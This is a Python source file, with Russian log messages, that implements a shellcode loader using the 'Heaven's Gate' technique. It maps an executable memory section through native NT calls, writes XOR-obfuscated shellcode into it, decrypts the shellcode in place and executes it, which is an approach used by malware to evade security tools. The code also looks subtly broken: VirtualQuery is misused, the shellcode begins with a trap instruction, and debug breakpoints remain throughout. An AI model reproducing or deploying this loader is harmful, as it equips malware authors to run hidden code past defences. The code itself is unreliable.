import ctypes
import logging
import sys
from crypto.xor_mask import RollingXOR

LP_c_ulong = ctypes.POINTER(ctypes.c_ulong)


class MemoryProtector:
    def __init__(self):
        self.logger = logging.getLogger("MemoryProtector")
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll

        self.kernel32.GetCurrentProcess.restype = ctypes.c_void_p
        self.ntdll.NtCreateSection.argtypes = [ctypes.POINTER(ctypes.c_void_p), ctypes.c_ulong,
                                               ctypes.POINTER(ctypes.c_ulong), ctypes.POINTER(ctypes.c_ulong),
                                               ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p]
        self.ntdll.NtMapViewOfSection.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p),
                                                  ctypes.c_ulong, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong),
                                                  ctypes.POINTER(ctypes.c_ulong), ctypes.c_ulong, ctypes.c_ulong,
                                                  ctypes.c_ulong]

    def heavens_gate(self, buffer, buffer_size, return_length: LP_c_ulong):
        self.logger.info("🚀 Переключение в 64-битный режим через Heaven’s Gate...")

        if not isinstance(buffer, ctypes.Array):
            raise TypeError("❌ Ошибка: buffer должен быть ctypes массивом!")
        if not isinstance(buffer_size, int):
            raise TypeError("❌ Ошибка: buffer_size должен быть int!")
        if not isinstance(return_length, LP_c_ulong):
            raise TypeError("❌ Ошибка: return_length должен быть ctypes указателем (LP_c_ulong)!")

        section_handle = ctypes.c_void_p()
        max_size = ctypes.c_ulong(4096)
        status = self.ntdll.NtCreateSection(ctypes.byref(section_handle), 0xF001F, None,
                                            ctypes.pointer(max_size), 0x40, 0x8000000, None)
        if status != 0:
            raise MemoryError(f"❌ Ошибка создания секции памяти: {status}")
        self.logger.info(f"✅ Выделена секция памяти: {hex(section_handle.value)}, размер: 4096")

        base_address = ctypes.c_void_p()
        view_size = ctypes.c_ulong(0)
        process_handle = self.kernel32.GetCurrentProcess()
        status = self.ntdll.NtMapViewOfSection(section_handle, process_handle, ctypes.byref(base_address),
                                               0, 0, None, ctypes.byref(view_size),
                                               1, 0, 0x40)
        if status != 0:
            raise MemoryError(f"❌ Ошибка отображения секции памяти: {status}")
        self.logger.info(f"✅ Shellcode загружен в {hex(base_address.value)}, размер: 36")

        shellcode = (
            b"\x90" * 8 +
            b"\xCC" +
            b"\x33\xC0" +
            b"\x0F\x01\xD0" +
            b"\x48\xB8\x33\x00\x00\x00\x00\x00\x00\x00" +
            b"\x50" +
            b"\xCB" +
            b"\x4C\x8B\xD1" +
            b"\xB8\x36\x00\x00\x00" +
            b"\x0F\x05" +
            b"\xC3"
        )

        # 🔒 Обфускация перед загрузкой
        xor = RollingXOR(b"\xA5\x5A")
        xor_shellcode = xor.encrypt(shellcode)
        self.logger.info("🔒 Применяем Rolling XOR к shellcode перед загрузкой")
        ctypes.memmove(base_address.value, xor_shellcode, len(xor_shellcode))

        self.logger.info(f"🔍 Проверяем base_address: {hex(base_address.value)}")
        self.logger.info(f"🔍 Первые байты (зашифр.): {ctypes.string_at(base_address.value, 16).hex()}")
        breakpoint()

        self.logger.info(f"✅ VirtualProtect() будет применяться к: {hex(base_address.value)}")

        old_protect = ctypes.c_ulong(0)
        self.kernel32.VirtualQuery(base_address, ctypes.byref(old_protect), ctypes.sizeof(old_protect))
        self.logger.info(f"🔍 VirtualQuery перед VirtualProtect: старые права: {hex(old_protect.value)}")

        base_address_c = ctypes.cast(base_address, ctypes.c_void_p)
        status = self.kernel32.VirtualProtect(base_address_c, len(shellcode), 0x40, ctypes.byref(old_protect))
        if status == 0:
            raise MemoryError("❌ Ошибка: VirtualProtect не смог сделать память исполняемой!")
        self.logger.info(f"🛠 VirtualProtect выполнен успешно, старые права: {hex(old_protect.value)}")

        if not base_address or base_address.value in (0x0, 0xFFFFFFFFFFFFFFFF):
            raise MemoryError(f"❌ Ошибка: base_address ({hex(base_address.value)}) невалидный!")

        breakpoint()

        # 🔓 Дешифровка shellcode в памяти
        decrypted = xor.decrypt(ctypes.string_at(base_address.value, len(shellcode)))
        ctypes.memmove(base_address.value, decrypted, len(decrypted))
        self.logger.info("🔓 Дешифровка в памяти завершена")

        try:
            func_type = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong))
            shell_func = func_type(base_address.value)
        except Exception as e:
            self.logger.error(f"❌ Ошибка приведения base_address к shell_func: {e}")
            raise MemoryError("Ошибка при преобразовании base_address в функцию!")

        self.logger.info(f"🔍 shell_func создан, адрес: {shell_func}")
        breakpoint()

        try:
            self.logger.info(f"🔍 base_address перед вызовом: {hex(base_address.value)}")
            self.logger.info(f"⚡ Попытка вызова shell_func @ {hex(base_address.value)}")
            result = shell_func(ctypes.byref(buffer), buffer_size, return_length)
            self.logger.info(f"✅ Shellcode выполнен, результат: {result}")
        except Exception as e:
            self.logger.error(f"❌ Ошибка выполнения shell-кода: {e}")
            raise MemoryError("Ошибка при выполнении shell-кода")

        return result
